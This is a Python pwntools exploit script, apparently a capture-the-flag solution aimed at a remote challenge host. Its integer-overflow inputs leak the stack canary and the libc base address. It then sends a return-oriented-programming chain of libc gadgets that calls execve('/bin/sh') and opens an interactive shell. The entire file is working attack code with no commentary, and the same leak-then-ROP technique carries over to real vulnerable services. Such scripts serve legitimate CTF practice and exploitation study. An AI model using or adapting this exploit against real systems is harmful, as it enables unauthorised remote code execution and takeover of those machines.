from pwn import *

#r=process("./vuln")
#gdb.attach(r)
r=remote("node1.hgame.vidar.club",30092)
pause()

r.sendline(b"16")
for i in range(15):
	r.recvuntil(b":")
	r.sendline(b"1")
num1=32+64*(2**32)
r.sendline(str(num1))
r.sendline(b"1")
r.recvuntil(b"Let's look at the results.")
for i in range(16):
	r.recvuntil(b"+ ")
canary=(int(r.recvuntil(b" ")[:-1]))
r.recvuntil(b"+ 1 + ")
libc_base=(int(r.recvuntil(b" ")[:-1])+2**64)%2**64-0x29D90
print(hex((canary+2**64)%2**64))
print(hex(libc_base))

r.recvuntil(b"What a pity!")
r.recvuntil(b"How many flowers have you prepared this time?")
r.sendline(b"16")
for i in range(15):
	r.recvuntil(b":")
	r.sendline(b"1")

print("b1")
pause()

num2=32+16*(2**32)
r.recvuntil(b":")
r.sendline(str(num2))
print("b2")
pause()
r.recvuntil(b":")
r.sendline(str(canary))
r.recvuntil(b":")
r.sendline("1")
libc=ELF("./libc.so.6")
rdi_add=0x2a3e5+libc_base
rsi_add=0x2be51+libc_base
rdx_add=0x904a9+libc_base#in fact,this is pop rdx ;pop rcx; ret;
rax_add=0x45eb0+libc_base
syscall_add=0x91316+libc_base
binsh_add=next(libc.search(b"/bin/sh"))+libc_base
#sys_add=libc.sym["system"]+libc_base
r.recvuntil(b":")
r.sendline(str(rdi_add))
r.recvuntil(b":")
r.sendline(str(binsh_add))
r.recvuntil(b":")
r.sendline(str(rsi_add))
r.recvuntil(b":")
r.sendline(str(0))
r.recvuntil(b":")
r.sendline(str(rdx_add))
r.recvuntil(b":")
r.sendline(str(0))
r.recvuntil(b":")
r.sendline(str(0))
r.recvuntil(b":")
r.sendline(str(rax_add))
r.recvuntil(b":")
r.sendline(str(59))
r.recvuntil(b":")
r.sendline(str(syscall_add))

r.interactive()
